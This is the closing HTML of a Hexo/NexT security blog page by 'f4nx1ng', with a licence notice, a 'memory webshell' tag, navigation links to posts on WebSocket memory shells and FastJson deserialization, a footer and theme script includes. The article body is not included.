      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag"># 内存马</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="WebSocket内存马">
                  <i class="fa fa-angle-left"></i> WebSocket内存马
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/08/03/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="FastJson反序列化漏洞">
                  FastJson反序列化漏洞 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>


  <script src="/js/third-party/fancybox.js"></script>



  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
